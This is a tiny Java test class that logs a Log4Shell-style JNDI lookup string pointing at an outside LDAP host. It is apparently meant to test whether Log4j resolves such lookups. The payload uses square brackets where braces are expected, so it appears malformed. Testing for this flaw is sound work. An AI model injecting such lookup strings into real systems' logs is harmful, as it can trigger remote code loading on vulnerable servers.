import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Author: An
 * @Date: 2021/12/10 11:21
 */
public class Test {

    private static  final Logger logger = LogManager.getLogger(Test.class);
    public static void main(String[] args) {
        logger.error("$[jndi:ldap://www.baidu.com]");
    }
}
